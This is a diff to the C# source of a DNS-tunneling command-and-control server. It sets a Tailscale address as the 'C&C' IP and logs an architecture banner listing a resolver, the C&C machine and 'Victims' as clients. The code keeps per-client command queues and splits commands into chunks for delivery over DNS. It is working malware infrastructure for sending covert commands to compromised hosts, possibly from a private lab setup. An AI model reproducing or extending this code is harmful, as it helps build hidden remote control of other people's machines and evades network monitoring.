@@ -1,7 +1,7 @@
 using System.Net;
 using System.Net.Sockets;
-using Server.Models;
 using Server.DNS;
+using Server.Models;
 using Server.Utilities;
 
 namespace Server.Logic
@@ -11,11 +11,11 @@ namespace Server.Logic
         private UdpClient? _udpServer;
         private bool _isRunning;
         private string _domain = "example.com";
-        private string _serverIp = "127.0.0.1";
+        private string _serverIp = "100.123.123.123";  // Default C&C IP on Tailscale
         
         private ClientManager? _clientManager;
         private ProtocolHandler? _protocolHandler;
-        private AuthoritativeDNSHandler? _dnsHandler;
+        // AuthoritativeDNSHandler removed - BIND9 handles normal DNS queries
         private readonly Dictionary<int, Queue<string>> _commandQueues = new();
         private readonly Dictionary<int, (string fullCommand, int totalChunks, int currentChunk)> _commandChunkState = new();
 
@@ -37,7 +37,7 @@ namespace Server.Logic
             
             _clientManager = new ClientManager(logPath);
             _protocolHandler = new ProtocolHandler(_domain);
-            _dnsHandler = new AuthoritativeDNSHandler(_domain, _serverIp);
+            // BIND9 handles normal DNS, no need for AuthoritativeDNSHandler
             
             _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
             _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
@@ -56,9 +56,11 @@ namespace Server.Logic
                 LogMessage($"[Domain] {_domain}");
                 LogMessage($"[Server IP] {_serverIp}");
                 LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
-                LogMessage("[MODE] LOCAL TEST - Direct client connections");
-                LogMessage("  => Client connects directly to this server");
-                LogMessage("  => No DNS Resolver needed");
+                LogMessage("[ARCHITECTURE] Tailscale DNS Tunneling");
+                LogMessage("  => DNS Resolver: 100.111.111.100 (Bind9)");
+                LogMessage("  => C&C Server: 100.123.123.123 (this machine)");
+                LogMessage("  => Victims: 100.x.x.x (clients)");
+                LogMessage("  => Flow: Client -> DNS Resolver -> C&C Server");
 
                 Task.Run(() => ListenForQueries());
             }
@@ -102,7 +104,7 @@ namespace Server.Logic
 
         private void ProcessQuery(byte[] data, IPEndPoint remoteEP)
         {
-            if (_clientManager == null || _protocolHandler == null || _dnsHandler == null)
+            if (_clientManager == null || _protocolHandler == null)
                 return;
 
             try
@@ -310,18 +312,15 @@ namespace Server.Logic
                     }
                     else
                     {
-                        throw new UnrelatedException();
+                        // Unknown packet type - should not happen as BIND9 only forwards our protocol queries
+                        LogMessage($"[Warning] Unknown packet type from {remoteEP.Address}: {packetType}");
+                        response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                     }
                 }
                 catch (ShortCircuitException)
                 {
                     LogMessage("  └─> Short circuit: duplicate packet");
                     response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
-                }
-                catch (UnrelatedException)
-                {
-                    LogMessage($"[Normal DNS Query] {queryName}");
-                    response = _dnsHandler.HandleQuery(data, dnsQuery, queryName);
                 }
                 catch (DNSSyntaxException)
                 {
